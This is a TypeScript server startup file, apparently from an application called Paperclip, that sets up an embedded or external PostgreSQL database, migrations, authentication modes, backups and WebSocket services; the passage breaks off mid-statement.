/// <reference path="./types/express.d.ts" />
// Kicks off the OTel bootstrap as early as possible (no-op unless
// OTEL_EXPORTER_OTLP_ENDPOINT is set). startServer() awaits
// instrumentationReady before opening DB connections or constructing the
// HTTP server, so trace coverage does not depend on incidental timing.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { instrumentationReady, shutdownInstrumentation } from "./instrumentation.js";
import { existsSync, readFileSync, rmSync } from "node:fs";
import { createServer } from "node:http";
import { resolve } from "node:path";
import { createInterface } from "node:readline/promises";
import { stdin, stdout } from "node:process";
import { pathToFileURL } from "node:url";
import type { Request as ExpressRequest, RequestHandler } from "express";
import { warnIfUnsupportedNodeVersion } from "@paperclipai/shared/node-version";
import { and, eq } from "drizzle-orm";
import {
  createDb,
  ensurePostgresDatabase,
  formatEmbeddedPostgresError,
  getPostgresDataDirectory,
  inspectMigrations,
  applyPendingMigrations,
  createEmbeddedPostgresLogBuffer,
  prepareEmbeddedPostgresNativeRuntime,
  reconcilePendingMigrationHistory,
  formatDatabaseBackupResult,
  runDatabaseBackup,
  authUsers,
  companies,
  companyMemberships,
  instanceUserRoles,
} from "@paperclipai/db";
import detectPort from "detect-port";
import { createApp } from "./app.js";
import { loadConfig } from "./config.js";
import { logger } from "./middleware/logger.js";
import {
  getManagedInstanceConfig,
  type ManagedInstanceConfig,
} from "./services/managed-config.js";
import { setupEnvironmentCustomImageTerminalWebSocketServer } from "./realtime/environment-custom-image-terminal-ws.js";
import { setupLiveEventsWebSocketServer } from "./realtime/live-events-ws.js";
import { cloudActorHeaderSourceFromHeaders, resolveCloudTenantActor } from "./middleware/auth.js";
import {
  feedbackService,
  applyManagedEnvironments,
  attentionService,
  backfillPrincipalAccessCompatibility,
  backfillLegacyToolOAuthTokens,
  bootstrapExecutionPolicyFromEnv,
  environmentCustomImageService,
  decisionService,
  decisionRetentionService,
  externalObjectService,
  executionWorkspaceService,
  heartbeatService,
  issueThreadInteractionService,
  issueService,
  instanceSettingsService,
  reconcileBuiltInAgentsOnStartup,
  reconcileCodexLocalManagedHomesOnStartup,
  reconcilePersistedRuntimeServicesOnStartup,
  routineService,
  statusCardService,
  toolAccessService,
  workspaceOperationService,
} from "./services/index.js";
import { queueIssueAssignmentWakeup } from "./services/issue-assignment-wakeup.js";
import { createSecretProposalsService } from "./services/secret-proposals.js";
import { environmentRuntimeService } from "./services/environment-runtime.js";
import { createDbAdapterAuthSessionStore } from "./services/codex-device-login-service.js";
import {
  createCodexDeviceLoginReaper,
  createProductionLoginSessionReaperRuntime,
} from "./services/codex-device-login-reaper.js";
import { createProductionSetupTokenReaper } from "./services/setup-token-reaper.js";
import { resolveWorktreeRunExecutionActivationState } from "./services/instance-settings.js";
import {
  parseAdapterRegistryEnv,
  reconcileAdapterAvailability,
} from "./services/adapter-registry-bootstrap.js";
import { createFeedbackTraceShareClientFromConfig } from "./services/feedback-share-client.js";
import { buildRuntimeApiCandidateUrls, choosePrimaryRuntimeApiUrl } from "./runtime-api.js";
import { isLoopbackHost, rewriteLoopbackUrlPort } from "./url-utils.js";
import { createPluginWorkerManager } from "./services/plugin-worker-manager.js";
import { createStorageServiceFromConfig } from "./storage/index.js";
import { printStartupBanner } from "./startup-banner.js";
import { getBoardClaimWarningUrl, initializeBoardClaimChallenge } from "./board-claim.js";
import { maybePersistWorktreeRuntimePorts } from "./worktree-config.js";
import { initTelemetry, getTelemetryClient } from "./telemetry.js";
import { conflict } from "./errors.js";
import { ensureDecisionSigningSecret } from "./services/decision-signing.js";
import { createDecisionRetentionNotifyOriginAgent, createDecisionWakeOriginAgent } from "./services/decision-wakeup.js";
import {
  coordinateHeartbeatSchedulerShutdown,
  finalizeServerShutdown,
  loadWithoutCoordinatedShutdownSignalHooks,
} from "./shutdown.js";
import { systemdNotify } from "./services/systemd-notify.js";
import { flushInFlightRunLogMirrors } from "./services/run-log-store.js";
import {
  createEmbeddedPostgresSupervisor,
  type EmbeddedPostgresSupervisor,
  type SupervisedEmbeddedPostgres,
} from "./embedded-postgres-supervisor.js";
import type {
  InstanceDatabaseBackupRunResult,
  InstanceDatabaseBackupTrigger,
} from "./routes/instance-database-backups.js";

type BetterAuthSessionUser = {
  id: string;
  email?: string | null;
  name?: string | null;
};

type BetterAuthSessionResult = {
  session: { id: string; userId: string } | null;
  user: BetterAuthSessionUser | null;
};

type EmbeddedPostgresInstance = SupervisedEmbeddedPostgres & {
  initialise(): Promise<void>;
};

type EmbeddedPostgresCtor = new (opts: {
  databaseDir: string;
  user: string;
  password: string;
  port: number;
  persistent: boolean;
  initdbFlags?: string[];
  onLog?: (message: unknown) => void;
  onError?: (message: unknown) => void;
}) => EmbeddedPostgresInstance;


export interface StartedServer {
  server: ReturnType<typeof createServer>;
  host: string;
  listenPort: number;
  apiUrl: string;
  databaseUrl: string;
}

export async function startServer(): Promise<StartedServer> {
  warnIfUnsupportedNodeVersion(process.versions.node, (message) => logger.warn(message));

  // Tracing must be active (or have failed and logged) before the first DB
  // connection or the HTTP server exists — see instrumentation.ts.
  await instrumentationReady;
  ensureDecisionSigningSecret();
  let config = loadConfig();
  initTelemetry({ enabled: config.telemetryEnabled });
  if (process.env.PAPERCLIP_SECRETS_PROVIDER === undefined) {
    process.env.PAPERCLIP_SECRETS_PROVIDER = config.secretsProvider;
  }
  if (process.env.PAPERCLIP_SECRETS_STRICT_MODE === undefined) {
    process.env.PAPERCLIP_SECRETS_STRICT_MODE = config.secretsStrictMode ? "true" : "false";
  }
  if (process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE === undefined) {
    process.env.PAPERCLIP_SECRETS_MASTER_KEY_FILE = config.secretsMasterKeyFilePath;
  }
  
  type MigrationSummary =
    | "skipped"
    | "already applied"
    | "applied (empty database)"
    | "applied (pending migrations)";
  
  function formatPendingMigrationSummary(migrations: string[]): string {
    if (migrations.length === 0) return "none";
    return migrations.length > 3
      ? `${migrations.slice(0, 3).join(", ")} (+${migrations.length - 3} more)`
      : migrations.join(", ");
  }
  
  async function promptApplyMigrations(migrations: string[]): Promise<boolean> {
    if (process.env.PAPERCLIP_MIGRATION_AUTO_APPLY === "true") return true;
    if (process.env.PAPERCLIP_MIGRATION_PROMPT === "never") return false;
    if (!stdin.isTTY || !stdout.isTTY) return true;
  
    const prompt = createInterface({ input: stdin, output: stdout });
    try {
      const answer = (await prompt.question(
        `Apply pending migrations (${formatPendingMigrationSummary(migrations)}) now? (y/N): `,
      )).trim().toLowerCase();
      return answer === "y" || answer === "yes";
    } finally {
      prompt.close();
    }
  }
  
  type EnsureMigrationsOptions = {
    autoApply?: boolean;
  };
  
  async function ensureMigrations(
    connectionString: string,
    label: string,
    opts?: EnsureMigrationsOptions,
  ): Promise<MigrationSummary> {
    const autoApply = opts?.autoApply === true;
    let state = await inspectMigrations(connectionString);
    if (state.status === "needsMigrations" && state.reason === "pending-migrations") {
      const repair = await reconcilePendingMigrationHistory(connectionString);
      if (repair.repairedMigrations.length > 0) {
        logger.warn(
          { repairedMigrations: repair.repairedMigrations },
          `${label} had drifted migration history; repaired migration journal entries from existing schema state.`,
        );
        state = await inspectMigrations(connectionString);
        if (state.status === "upToDate") return "already applied";
      }
    }
    if (state.status === "upToDate") return "already applied";
    if (state.status === "needsMigrations" && state.reason === "no-migration-journal-non-empty-db") {
      logger.warn(
        { tableCount: state.tableCount },
        `${label} has existing tables but no migration journal. Run migrations manually to sync schema.`,
      );
      const apply = autoApply ? true : await promptApplyMigrations(state.pendingMigrations);
      if (!apply) {
        throw new Error(
          `${label} has pending migrations (${formatPendingMigrationSummary(state.pendingMigrations)}). ` +
            "Refusing to start against a stale schema. Run pnpm db:migrate or set PAPERCLIP_MIGRATION_AUTO_APPLY=true.",
        );
      }
  
      logger.info({ pendingMigrations: state.pendingMigrations }, `Applying ${state.pendingMigrations.length} pending migrations for ${label}`);
      await applyPendingMigrations(connectionString);
      return "applied (pending migrations)";
    }
  
    const apply = autoApply ? true : await promptApplyMigrations(state.pendingMigrations);
    if (!apply) {
      throw new Error(
        `${label} has pending migrations (${formatPendingMigrationSummary(state.pendingMigrations)}). ` +
          "Refusing to start against a stale schema. Run pnpm db:migrate or set PAPERCLIP_MIGRATION_AUTO_APPLY=true.",
      );
    }
  
    logger.info({ pendingMigrations: state.pendingMigrations }, `Applying ${state.pendingMigrations.length} pending migrations for ${label}`);
    await applyPendingMigrations(connectionString);
    return "applied (pending migrations)";
  }
  
  function isPostgresConnectionString(connectionString: string): boolean {
    try {
      const parsed = new URL(connectionString);
      return parsed.protocol === "postgres:" || parsed.protocol === "postgresql:";
    } catch {
      return false;
    }
  }

  function assertCloudDatabaseContract(): void {
    if (config.deploymentMode !== "authenticated" || config.deploymentExposure !== "public") {
      return;
    }
    if (!config.databaseUrl) {
      throw new Error(
        "authenticated public deployments require DATABASE_URL or config.database.connectionString; refusing embedded PostgreSQL fallback",
      );
    }
    if (!isPostgresConnectionString(config.databaseUrl)) {
      throw new Error(
        "authenticated public deployments require DATABASE_URL to be a postgres/postgresql connection string",
      );
    }
  }

  const LOCAL_BOARD_USER_ID = "local-board";
  const LOCAL_BOARD_USER_EMAIL = "local@paperclip.local";
  const LOCAL_BOARD_USER_NAME = "Board";
  
  async function ensureLocalTrustedBoardPrincipal(db: any): Promise<void> {
    const now = new Date();
    const existingUser = await db
      .select({ id: authUsers.id })
      .from(authUsers)
      .where(eq(authUsers.id, LOCAL_BOARD_USER_ID))
      .then((rows: Array<{ id: string }>) => rows[0] ?? null);
  
    if (!existingUser) {
      await db.insert(authUsers).values({
        id: LOCAL_BOARD_USER_ID,
        name: LOCAL_BOARD_USER_NAME,
        email: LOCAL_BOARD_USER_EMAIL,
        emailVerified: true,
        image: null,
        createdAt: now,
        updatedAt: now,
      });
    }
  
    const role = await db
      .select({ id: instanceUserRoles.id })
      .from(instanceUserRoles)
      .where(and(eq(instanceUserRoles.userId, LOCAL_BOARD_USER_ID), eq(instanceUserRoles.role, "instance_admin")))
      .then((rows: Array<{ id: string }>) => rows[0] ?? null);
    if (!role) {
      await db.insert(instanceUserRoles).values({
        userId: LOCAL_BOARD_USER_ID,
        role: "instance_admin",
      });
    }
  
    const companyRows = await db.select({ id: companies.id }).from(companies);
    for (const company of companyRows) {
      const membership = await db
        .select({ id: companyMemberships.id })
        .from(companyMemberships)
        .where(
          and(
            eq(companyMemberships.companyId, company.id),
            eq(companyMemberships.principalType, "user"),
            eq(companyMemberships.principalId, LOCAL_BOARD_USER_ID),
          ),
        )
        .then((rows: Array<{ id: string }>) => rows[0] ?? null);
      if (membership) continue;
      await db.insert(companyMemberships).values({
        companyId: company.id,
        principalType: "user",
        principalId: LOCAL_BOARD_USER_ID,
        status: "active",
        membershipRole: "owner",
      });
    }
  }
  
  let db;
  let pluginMigrationDb;
  let embeddedPostgres: EmbeddedPostgresInstance | null = null;
  let embeddedPostgresSupervisor: EmbeddedPostgresSupervisor | null = null;
  let embeddedPostgresStartedByThisProcess = false;
  let migrationSummary: MigrationSummary = "skipped";
  let activeDatabaseConnectionString: string;
  let resolvedEmbeddedPostgresPort: number | null = null;
  let startupDbInfo:
    | { mode: "external-postgres"; connectionString: string }
    | { mode: "embedded-postgres"; dataDir: string; port: number };
  assertCloudDatabaseContract();
  if (config.databaseUrl) {
    const migrationUrl = config.databaseMigrationUrl ?? config.databaseUrl;
    migrationSummary = await ensureMigrations(migrationUrl, "PostgreSQL");
  
    db = createDb(config.databaseUrl);
    pluginMigrationDb = config.databaseMigrationUrl ? createDb(config.databaseMigrationUrl) : db;
    logger.info("Using external PostgreSQL via DATABASE_URL/config");
    activeDatabaseConnectionString = config.databaseUrl;
    startupDbInfo = { mode: "external-postgres", connectionString: config.databaseUrl };
  } else {
    const moduleName = "embedded-postgres";
    let EmbeddedPostgres: EmbeddedPostgresCtor;
    try {
      // embedded-postgres registers async-exit-hook handlers as an import side
      // effect. Those handlers stop PostgreSQL immediately on SIGINT/SIGTERM,
      // racing Paperclip's later heartbeat snapshot query. Paperclip explicitly
      // stops the managed cluster in its own ordered shutdown path instead.
      const mod = await loadWithoutCoordinatedShutdownSignalHooks(
        () => import(moduleName),
      );
      EmbeddedPostgres = mod.default as EmbeddedPostgresCtor;
    } catch {
      throw new Error(
        "Embedded PostgreSQL mode requires dependency `embedded-postgres`. Reinstall dependencies (without omitting required packages), or set DATABASE_URL for external Postgres.",
      );
    }
    await prepareEmbeddedPostgresNativeRuntime();
  
    const dataDir = resolve(config.embeddedPostgresDataDir);
    const configuredPort = config.embeddedPostgresPort;
    let port = configuredPort;
    const logBuffer = createEmbeddedPostgresLogBuffer(120);
    const verboseEmbeddedPostgresLogs = process.env.PAPERCLIP_EMBEDDED_POSTGRES_VERBOSE === "true";
    const appendEmbeddedPostgresLog = (message: unknown) => {
      logBuffer.append(message);
      if (!verboseEmbeddedPostgresLogs) {
        return;
      }
      const lines = typeof message === "string"
        ? message.split(/\r?\n/)
        : message instanceof Error
          ? [message.message]
          : [String(message ?? "")];
      for (const lineRaw of lines) {
        const line = lineRaw.trim();
        if (!line) continue;
        logger.info({ embeddedPostgresLog: line }, "embedded-postgres");
      }
    };
    const logEmbeddedPostgresFailure = (phase: "initialise" | "start", err: unknown) => {
      const recentLogs = logBuffer.getRecentLogs();
      if (recentLogs.length > 0) {
        logger.error(
          {
            phase,
            recentLogs,
            err,
          },
          "Embedded PostgreSQL failed; showing buffered startup logs",
        );
      }
    };
  
    if (config.databaseMode === "postgres") {
      logger.warn("Database mode is postgres but no connection string was set; falling back to embedded PostgreSQL");
    }
  
    const clusterVersionFile = resolve(dataDir, "PG_VERSION");
    const clusterAlreadyInitialized = existsSync(clusterVersionFile);
    const postmasterPidFile = resolve(dataDir, "postmaster.pid");
    const isPidRunning = (pid: number): boolean => {
      try {
        process.kill(pid, 0);
        return true;
      } catch {
        return false;
      }
    };
  
    const getRunningPid = (): number | null => {
      if (!existsSync(postmasterPidFile)) return null;
      try {
        const pidLine = readFileSync(postmasterPidFile, "utf8").split("\n")[0]?.trim();
        const pid = Number(pidLine);
        if (!Number.isInteger(pid) || pid <= 0) return null;
        if (!isPidRunning(pid)) return null;
        return pid;
      } catch {
        return null;
      }
    };
  
    const runningPid = getRunningPid();
    if (runningPid) {
      logger.warn(`Embedded PostgreSQL already running; reusing existing process (pid=${runningPid}, port=${port})`);
    } else {
      const configuredAdminConnectionString = `postgres://paperclip:paperclip@127.0.0.1:${configuredPort}/postgres`;
      try {
        const actualDataDir = await getPostgresDataDirectory(configuredAdminConnectionString);
        if (
          typeof actualDataDir !== "string" ||
          resolve(actualDataDir) !== resolve(dataDir)
        ) {
          throw new Error("reachable postgres does not use the expected embedded data directory");
        }
        await ensurePostgresDatabase(configuredAdminConnectionString, "paperclip");
        logger.warn(
          `Embedded PostgreSQL appears to already be reachable without a pid file; reusing existing server on configured port ${configuredPort}`,
        );
      } catch {
        const detectedPort = await detectPort(configuredPort);
        if (detectedPort !== configuredPort) {
          logger.warn(`Embedded PostgreSQL port is in use; using next free port (requestedPort=${configuredPort}, selectedPort=${detectedPort})`);
        }
        port = detectedPort;
        logger.info(`Using embedded PostgreSQL because no DATABASE_URL set (dataDir=${dataDir}, port=${port})`);
        const createEmbeddedPostgres = () => new EmbeddedPostgres({
          databaseDir: dataDir,
          user: "paperclip",
          password: "paperclip",
          port,
          persistent: true,
          initdbFlags: ["--encoding=UTF8", "--locale=C", "--lc-messages=C"],
          onLog: appendEmbeddedPostgresLog,
          onError: appendEmbeddedPostgresLog,
        });
        embeddedPostgres = createEmbeddedPostgres();

        if (!clusterAlreadyInitialized) {
          try {
            await embeddedPostgres.initialise();
          } catch (err) {
            logEmbeddedPostgresFailure("initialise", err);
            throw formatEmbeddedPostgresError(err, {
              fallbackMessage: `Failed to initialize embedded PostgreSQL cluster in ${dataDir} on port ${port}`,
              recentLogs: logBuffer.getRecentLogs(),
            });
          }
        } else {
          logger.info(`Embedded PostgreSQL cluster already exists (${clusterVersionFile}); skipping init`);
        }

        if (existsSync(postmasterPidFile)) {
          logger.warn("Removing stale embedded PostgreSQL lock file");
          rmSync(postmasterPidFile, { force: true });
        }
        try {
          await embeddedPostgres.start();
        } catch (err) {
          logEmbeddedPostgresFailure("start", err);
          throw formatEmbeddedPostgresError(err, {
            fallbackMessage: `Failed to start embedded PostgreSQL on port ${port}`,
            recentLogs: logBuffer.getRecentLogs(),
          });
        }
        embeddedPostgresStartedByThisProcess = true;
        embeddedPostgresSupervisor = createEmbeddedPostgresSupervisor({
          initialInstance: embeddedPostgres,
          createInstance: createEmbeddedPostgres,
          beforeRestart: () => {
            const runningPostgresPid = getRunningPid();
            if (runningPostgresPid) {
              throw new Error(`Refusing embedded PostgreSQL recovery because the data directory reports a live process (pid=${runningPostgresPid})`);
            }
            if (existsSync(postmasterPidFile)) rmSync(postmasterPidFile, { force: true });
          },
          onUnexpectedExit: (code, signal) => logger.error(
            { code, signal, recentLogs: logBuffer.getRecentLogs() },
            "Embedded PostgreSQL exited unexpectedly; attempting recovery",
          ),
          onRestartAttemptFailed: (err, attempt) => logger.error(
            { err, attempt, recentLogs: logBuffer.getRecentLogs() },
            "Embedded PostgreSQL recovery attempt failed",
          ),
          onRestarted: (attempt) => logger.info(
            { attempt, port },
            "Embedded PostgreSQL recovered after unexpected exit",
          ),
          onRecoveryExhausted: (err) => {
            logger.fatal(
              { err, recentLogs: logBuffer.getRecentLogs() },
              "Embedded PostgreSQL recovery exhausted; stopping the unhealthy server",
            );
            process.kill(process.pid, "SIGTERM");
          },
        });
      }
    }
  
    const embeddedAdminConnectionString = `postgres://paperclip:paperclip@127.0.0.1:${port}/postgres`;
    const dbStatus = await ensurePostgresDatabase(embeddedAdminConnectionString, "paperclip");
    if (dbStatus === "created") {
      logger.info("Created embedded PostgreSQL database: paperclip");
    }
  
    const embeddedConnectionString = `postgres://paperclip:paperclip@127.0.0.1:${port}/paperclip`;
    const shouldAutoApplyFirstRunMigrations = !clusterAlreadyInitialized || dbStatus === "created";
    if (shouldAutoApplyFirstRunMigrations) {
      logger.info("Detected first-run embedded PostgreSQL setup; applying pending migrations automatically");
    }
    migrationSummary = await ensureMigrations(embeddedConnectionString, "Embedded PostgreSQL", {
      autoApply: shouldAutoApplyFirstRunMigrations,
    });
  
    db = createDb(embeddedConnectionString);
    pluginMigrationDb = db;
    logger.info("Embedded PostgreSQL ready");
    activeDatabaseConnectionString = embeddedConnectionString;
    resolvedEmbeddedPostgresPort = port;
    startupDbInfo = { mode: "embedded-postgres", dataDir, port };
  }
  
  if (config.deploymentMode === "local_trusted" && !isLoopbackHost(config.host)) {
    throw new Error(
      `local_trusted mode requires loopback host binding (received: ${config.host}). ` +
        "Use authenticated mode for non-loopback deployments.",
    );
  }
  
  if (config.deploymentMode === "local_trusted" && config.deploymentExposure !== "private") {
    throw new Error("local_trusted mode only supports private exposure");
  }
  
  if (config.deploymentMode === "authenticated") {
    if (config.authBaseUrlMode === "explicit" && !config.authPublicBaseUrl) {
      throw new Error("auth.baseUrlMode=explicit requires auth.publicBaseUrl");
    }
    if (config.deploymentExposure === "public") {
      if (config.authBaseUrlMode !== "explicit") {
        throw new Error("authenticated public exposure requires auth.baseUrlMode=explicit");
      }
      if (!config.authPublicBaseUrl) {
        throw new Error("authenticated public exposure requires auth.publicBaseUrl");
      }
    }
  }

  const requestedListenPort = config.port;
  const listenPort = await detectPort(requestedListenPort);
  if (config.authBaseUrlMode === "explicit" && config.authPublicBaseUrl) {
    config.authPublicBaseUrl = rewriteLoopbackUrlPort(config.authPublicBaseUrl, listenPort);
  }
  
  let authReady = config.deploymentMode === "local_trusted";
  let betterAuthHandler: RequestHandler | undefined;
  let resolveSession:
    | ((req: ExpressRequest) => Promise<BetterAuthSessionResult | null>)
    | undefined;
  let resolveSessionFromHeaders:
    | ((headers: Headers) => Promise<BetterAuthSessionResult | null>)
    | undefined;
  if (config.deploymentMode === "local_trusted") {
    await ensureLocalTrustedBoardPrincipal(db as any);
  }
  const accessBackfill = await backfillPrincipalAccessCompatibility(db as any);
  if (accessBackfill.agentMembershipsInserted > 0 || accessBackfill.humanGrantsInserted > 0) {
    logger.info(accessBackfill, "Backfilled principal access compatibility records");
  }
  const toolOAuthBackfill = await backfillLegacyToolOAuthTokens(db as any);
  if (toolOAuthBackfill.sanitizedConnections > 0 || toolOAuthBackfill.migratedConnections > 0) {
    logger.info(toolOAuthBackfill, "Backfilled legacy tool OAuth credentials into company secrets");
  }
  const confirmationSweep = await issueThreadInteractionService(db as any)
    .sweepSupersededPendingRequestConfirmations();
  if (confirmationSweep.expired > 0) {
    logger.info(confirmationSweep, "Expired pending confirmations superseded by newer agent requests");
  }
  if (config.deploymentMode === "authenticated") {
    const {
      createBetterAuthHandler,
      createBetterAuthInstance,
      deriveAuthTrustedOrigins,
      resolveBetterAuthSession,
      resolveBetterAuthSessionFromHeaders,
    } = await import("./auth/better-auth.js");
    const derivedTrustedOrigins = deriveAuthTrustedOrigins(config, { listenPort });
    const envTrustedOrigins = (process.env.BETTER_AUTH_TRUSTED_ORIGINS ?? "")
      .split(",")
      .map((value) => value.trim())
      .filter((value) => value.length > 0);
    const effectiveTrustedOrigins = Array.from(new Set([...derivedTrustedOrigins, ...envTrustedOrigins]));
    logger.info(
      {
        authBaseUrlMode: config.authBaseUrlMode,
        authPublicBaseUrl: config.authPublicBaseUrl ?? null,
        trustedOrigins: effectiveTrustedOrigins,
        trustedOriginsSource: {
          derived: derivedTrustedOrigins.length,
          env: envTrustedOrigins.length,
        },
      },
      "Authenticated mode auth origin configuration",
    );
    const auth = createBetterAuthInstance(db as any, config, effectiveTrustedOrigins);
    betterAuthHandler = createBetterAuthHandler(auth);
    resolveSession = (req) => resolveBetterAuthSession(auth, req);
    resolveSessionFromHeaders = (headers) => resolveBetterAuthSessionFromHeaders(auth, headers);
    await initializeBoardClaimChallenge(db as any, { deploymentMode: config.deploymentMode });
    authReady = true;
  }

  if (resolvedEmbeddedPostgresPort !== null && resolvedEmbeddedPostgresPort !== config.embeddedPostgresPort) {
    config.embeddedPostgresPort = resolvedEmbeddedPostgresPort;
  }
  maybePersistWorktreeRuntimePorts({
    serverPort: listenPort,
    databasePort: resolvedEmbeddedPostgresPort,
  });
  // Cloud managed-config contract (harness → app). Parse PAPERCLIP_MANAGED_CONFIG
  // once so a malformed document (blank value, bad JSON, unknown feature key,
  // unsupported v, missing section) refuses startup with a precise error instead
  // of silently running without the feature overlay. Absent env = self-hosted:
  // nothing changes. The parsed document is never persisted; instanceSettingsService
  // overlays it per read. This MUST run before any instanceSettingsService(db)
  // construction — that constructor parses the same env, and it would otherwise
  // throw first, bypassing this fail-closed log path.
  let managedConfig: ManagedInstanceConfig | null;
  try {
    managedConfig = getManagedInstanceConfig();
    if (managedConfig) {
      logger.warn(
        {
          catalogVersion: managedConfig.catalogVersion,
          managedFeatureKeys: Object.keys(managedConfig.features).sort(),
          autoInstallPlugins: [...managedConfig.plugins.autoInstall],
        },
        "cloud managed configuration active",
      );
    }
  } catch (err) {
    logger.error({ err }, "invalid PAPERCLIP_MANAGED_CONFIG; refusing to start (fail closed)");
    throw err;
  }

  const uiMode = config.uiDevMiddleware ? "vite-dev" : config.serveUi ? "static" : "none";
  const storageService = createStorageServiceFromConfig(config);
  const feedback = feedbackService(db as any, {
    shareClient: createFeedbackTraceShareClientFromConfig(config),
  });
  const backupSettingsSvc = instanceSettingsService(db);
  const databaseBackupMaxAgeHours = Math.max(
    1,
    Number(process.env.PAPERCLIP_DB_BACKUP_MAX_AGE_HOURS) ||
      Math.max(26, Math.ceil((config.databaseBackupIntervalMinutes / 60) * 2)),
  );
  const databaseBackupAlertFile =
    process.env.PAPERCLIP_DB_BACKUP_ALERT_FILE ||
    resolve(config.databaseBackupDir, "..", "health", "db-backup-to-s3.failure");
  const databaseBackupAlertFiles = [
    databaseBackupAlertFile,
    resolve(config.databaseBackupDir, "db-backup-to-s3.failure"),
    resolve(config.databaseBackupDir, "..", "db-backup-to-s3.failure"),
  ];
  let databaseBackupInFlight = false;
  const runServerDatabaseBackup = async (
    trigger: InstanceDatabaseBackupTrigger,
  ): Promise<InstanceDatabaseBackupRunResult | null> => {
    if (databaseBackupInFlight) {
      const message = "Database backup already in progress";
      if (trigger === "scheduled") {
        logger.warn("Skipping scheduled database backup because a previous backup is still running");
        return null;
      }
      throw conflict(message);
    }

    databaseBackupInFlight = true;
    const startedAt = new Date();
    const startedAtMs = Date.now();
    const label = trigger === "scheduled" ? "Automatic" : "Manual";
    try {
      logger.info({ backupDir: config.databaseBackupDir, trigger }, `${label} database backup starting`);
      // Read retention from Instance Settings (DB) so changes take effect without restart.
      const generalSettings = await backupSettingsSvc.getGeneral();
      const retention = generalSettings.backupRetention;

      const result = await runDatabaseBackup({
        connectionString: activeDatabaseConnectionString,
        backupDir: config.databaseBackupDir,
        retention,
        filenamePrefix: "paperclip",
      });
      const finishedAt = new Date();
      const response: InstanceDatabaseBackupRunResult = {
        ...result,
        trigger,
        backupDir: config.databaseBackupDir,
        retention,
        startedAt: startedAt.toISOString(),
        finishedAt: finishedAt.toISOString(),
        durationMs: Date.now() - startedAtMs,
      };
      logger.info(
        {
          backupFile: result.backupFile,
          sizeBytes: result.sizeBytes,
          prunedCount: result.prunedCount,
          backupDir: config.databaseBackupDir,
          retention,
          trigger,
          durationMs: response.durationMs,
        },
        `${label} database backup complete: ${formatDatabaseBackupResult(result)}`,
      );
      return response;
    } catch (err) {
      logger.error({ err, backupDir: config.databaseBackupDir, trigger }, `${label} database backup failed`);
      throw err;
    } finally {
      databaseBackupInFlight = false;
    }
  };
  const pluginWorkerManager = createPluginWorkerManager();
  const heartbeat = config.heartbeatSchedulerEnabled
    ? heartbeatService(db as any, { pluginWorkerManager })
    : null;
  const decisionServiceOptions = {
    wakeOriginAgent: createDecisionWakeOriginAgent(heartbeat?.wakeup ?? null),
  };
  // Managed instances drive bundled plugin auto-install from the managed-config
  // document parsed fail-closed above (`plugins.autoInstall`). Absent env means
  // self-hosted: createApp falls back to its built-in kubernetes-only default.
  const managedPluginAutoInstall = managedConfig?.plugins.autoInstall ?? null;
  const app = await createApp(db as any, {
    uiMode,
    serverPort: listenPort,
    storageService,
    feedbackExportService: feedback,
    databaseBackupService: {
      runManualBackup: async () => {
        const result = await runServerDatabaseBackup("manual");
        if (!result) {
          throw conflict("Database backup already in progress");
        }
        return result;
      },
    },
    databaseBackupHealth: config.databaseBackupEnabled
      ? {
          enabled: config.databaseBackupEnabled,
          backupDir: config.databaseBackupDir,
          maxAgeHours: databaseBackupMaxAgeHours,
          alertFile: databaseBackupAlertFile,
          alertFiles: databaseBackupAlertFiles,
        }
      : undefined,
    deploymentMode: config.deploymentMode,
    deploymentExposure: config.deploymentExposure,
    allowedHostnames: config.allowedHostnames,
    bindHost: config.host,
    authPublicBaseUrl: config.authPublicBaseUrl,
    authReady,
    companyDeletionEnabled: config.companyDeletionEnabled,
    pluginMigrationDb: pluginMigrationDb as any,
    betterAuthHandler,
    resolveSession,
    pluginWorkerManager,
    decisionServiceOptions,
    managedPluginAutoInstall,
  });
  const server = createServer(app as unknown as Parameters<typeof createServer>[0]);

  // Increase keep-alive timeouts to safely outlive default idle timeouts
  // of common reverse proxies and load balancers (like AWS ALB, Nginx, or Traefik).
  // This prevents intermittent 502/ECONNRESET errors caused by Node's 5s default.
  server.keepAliveTimeout = 185000;
  server.headersTimeout = 186000;
  
  if (listenPort !== requestedListenPort) {
    logger.warn(`Requested port is busy; using next free port (requestedPort=${requestedListenPort}, selectedPort=${listenPort})`);
  }
  
  const runtimeListenHost = config.host;
  const runtimeApiUrl = choosePrimaryRuntimeApiUrl({
    authPublicBaseUrl: config.authPublicBaseUrl ?? null,
    allowedHostnames: config.allowedHostnames,
    bindHost: runtimeListenHost,
    port: listenPort,
  });
  const configuredApiUrl = process.env.PAPERCLIP_API_URL?.trim() || runtimeApiUrl;
  const runtimeApiCandidates = buildRuntimeApiCandidateUrls({
    preferredApiUrl: configuredApiUrl,
    authPublicBaseUrl: config.authPublicBaseUrl ?? null,
    allowedHostnames: config.allowedHostnames,
    bindHost: runtimeListenHost,
    port: listenPort,
  });
  process.env.PAPERCLIP_LISTEN_HOST = runtimeListenHost;
  process.env.PAPERCLIP_LISTEN_PORT = String(listenPort);
  process.env.PAPERCLIP_RUNTIME_API_URL = runtimeApiUrl;
  process.env.PAPERCLIP_RUNTIME_API_CANDIDATES_JSON = JSON.stringify(runtimeApiCandidates);
  process.env.PAPERCLIP_API_URL = configuredApiUrl;
  
  setupEnvironmentCustomImageTerminalWebSocketServer(server, db as any, {
    pluginWorkerManager,
  });
  setupLiveEventsWebSocketServer(server, db as any, {
    deploymentMode: config.deploymentMode,
    resolveSessionFromHeaders,
    // Cloud-proxied browsers carry trusted x-paperclip-cloud-* headers instead
    // of a local Better Auth session; without this lane every live-events
    // upgrade behind the Cloud front door 403s forever. The resolver is
    // self-gating: it returns null unless PAPERCLIP_CLOUD_TENANT_SERVER_TOKEN
    // is configured and the request presents the matching trust token, so
    // self-hosted deployments never take this path.
    resolveCloudActor: async (req) => {
      const actor = await resolveCloudTenantActor(
        db as any,
        cloudActorHeaderSourceFromHeaders(req.headers),
      );
      if (!actor?.userId || !actor.companyIds) return null;
      return { userId: actor.userId, companyIds: actor.companyIds };
    },
  });

  try {
    const result = await workspaceOperationService(db as any)
      .reconcileStaleRuntimeControlOperations();
    if (result.reconciled > 0) {
      logger.warn(
        { reconciled: result.reconciled, operationIds: result.operationIds },
        "reconciled stale managed runtime control operations from a previous server process",
      );
    }
  } catch (err) {
    logger.error({ err }, "startup reconciliation of managed runtime control operations failed");
  }

  void reconcilePersistedRuntimeServicesOnStartup(db as any)
    .then((result) => {
      if (
